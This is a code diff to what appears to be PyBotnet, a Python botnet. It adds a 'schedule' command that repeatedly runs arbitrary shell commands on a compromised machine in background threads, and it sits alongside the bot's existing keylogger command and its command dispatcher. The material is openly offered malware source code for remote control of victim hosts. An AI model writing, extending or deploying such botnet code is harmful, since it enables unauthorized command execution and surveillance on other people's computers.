@@ -41,7 +41,7 @@ scripts_name = {
 
     "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
 
-    "schedule": """`schedule start <shell-command> <second>`: Starts a new schedule for a command.
+    "schedule": """`schedule start <second> <shell-command>`: Starts a new schedule for a command.
     `schedule list`: lists all schedules
     `schedule stop <schedule name>`: Stops a schedule
     """,
@@ -156,7 +156,8 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             elif command_name == "keylogger" and split_command(command)[1] in ['start','stop']:
                 return keylogger(logger,command)
 
-            
+            elif command_name == "schedule" and split_command(command)[1] in ["start","stop","list"]:
+                return scheduler_script(logger,command)     
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -460,9 +461,44 @@ def keylogger(logger,command):
 
         except:
             return 'keylogger is already off.'
-        
+    
 
+def scheduler_script(logger,command):
+    """This script will handle almost everything about scheduler.
+        listOfSchedules is a dictionary of command names that are running 
+        as keys and threading objects and seconds that the schedule runs each time as values.    
+    """
 
+    splitted_command = split_command(command)
+    if splitted_command[1] == "start":
+        if splitted_command[2].isdigit():
+            second = splitted_command[2]
+            command = ' '.join(splitted_command[3:])
+            scheduler_util = util.ScheduleManagement(int(second),
+                                                     command)
+            scheduler_util.listOfSchedules[command] = [threading.Thread(target=scheduler_util.startSchedule),
+                                                                   second]
+            scheduler_util.listOfSchedules[command][0].start() #starts threading object
+            logger.info(f"Started Schedule {command} , will run each {second} second")
+            return f"Started Schedule {command} , will run each {second} second"
+
+        else:
+            return "Second should be a digit"
+
+    elif splitted_command[1] == "list":
+        listOfSchedules_ToReturn = []
+        listOfSchedules = util.ScheduleManagement.listOfSchedules
+        for key,value in zip(listOfSchedules.keys(),listOfSchedules.values()):
+            listOfSchedules_ToReturn.append(f"Command Name = {key} , Will run each {value[1]} second")    
+        return "\n".join(listOfSchedules_ToReturn)
+
+    elif splitted_command[1] == "stop":
+        listOfSchedules = util.ScheduleManagement.listOfSchedules
+        command = ' '.join(splitted_command[2:])
+        logger.info(f"Stopping Schedule {command}")
+        threadObject = listOfSchedules[command][0]
+        listOfSchedules.pop(command)
+        threadObject.join()
 
 
 
